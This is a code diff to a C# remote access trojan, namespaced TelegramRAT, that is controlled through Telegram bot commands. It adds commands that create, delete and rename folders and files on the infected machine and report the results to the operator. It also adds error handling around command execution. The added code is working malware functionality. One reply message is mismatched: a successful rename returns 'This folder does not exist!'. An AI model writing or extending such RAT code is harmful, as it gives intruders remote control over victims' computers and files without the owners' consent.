@@ -1203,6 +1203,91 @@ namespace TelegramRAT
                 }
             });
 
+            //CREATE FOLDER
+            commands.Add(new BotCommand
+            {
+                Command = "/createfolder",
+                Description = "/Create folder",
+                Execute = async (model, update) =>
+                {
+                    await Task.Run(() =>
+                    {
+                        try
+                        {
+                            if (!Directory.Exists(model.RawArgs))
+                            {
+                                Directory.CreateDirectory(model.RawArgs);
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                            }
+                            else
+                            {
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder already exists!", replyToMessageId: update.Message.MessageId);
+                            }
+                        }
+                        catch (Exception e)
+                        {
+                            ReportError(update, e);
+                        }
+                    });
+                }
+            });
+
+            //DELETE FOLDER
+            commands.Add(new BotCommand
+            {
+                Command = "/deletefolder",
+                Description = "Delete folder.",
+                Execute = async(model, update) =>
+                {
+                    await Task.Run(() =>
+                    {
+                        try
+                        {
+                            if (Directory.Exists(model.RawArgs))
+                            {
+                                Directory.Delete(model.RawArgs);
+                            }
+                            else
+                            {
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder does not exist!", replyToMessageId: update.Message.MessageId);
+                            }
+                        }
+                        catch (Exception e)
+                        {
+                            ReportError(update, e);
+                        }
+                    });
+                }
+            });
+
+            //RENAME FILE
+            commands.Add(new BotCommand
+            {
+                Command = "/renamefile",
+                Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
+                Example = "/renamefile C:\\Users\\User\\Documents\\oldname.txt newname.txt",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        if (System.IO.File.Exists(model.Args[0]))
+                        {
+                            string fileToRename = Path.GetFullPath(model.Args[0]);
+                            string newFileName = $"{Path.GetDirectoryName(fileToRename)}\\{model.Args[1]}";
+                            System.IO.File.Move(fileToRename, newFileName);
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "This folder does not exist!", replyToMessageId: update.Message.MessageId);
+                        }
+                        else
+                        {
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "This file does not exist!", replyToMessageId: update.Message.MessageId);
+                        }
+                    });
+                }
+            });
+
+
+
+
             #endregion
 
 
@@ -1309,7 +1394,14 @@ namespace TelegramRAT
                             {
                                 await Task.Run(() =>
                                 {
-                                    cmd.Execute.Invoke(model, update);
+                                    try
+                                    {
+                                        cmd.Execute.Invoke(model, update);
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        ReportError(update, ex);
+                                    }
                                 });
 
                             }
@@ -1318,7 +1410,14 @@ namespace TelegramRAT
 
                                 await Task.Run(() =>
                                 {
-                                    cmd.Execute.Invoke(model, update);
+                                    try
+                                    {
+                                        cmd.Execute.Invoke(model, update);
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        ReportError(update, ex);
+                                    }
                                 });
                             }
                             else
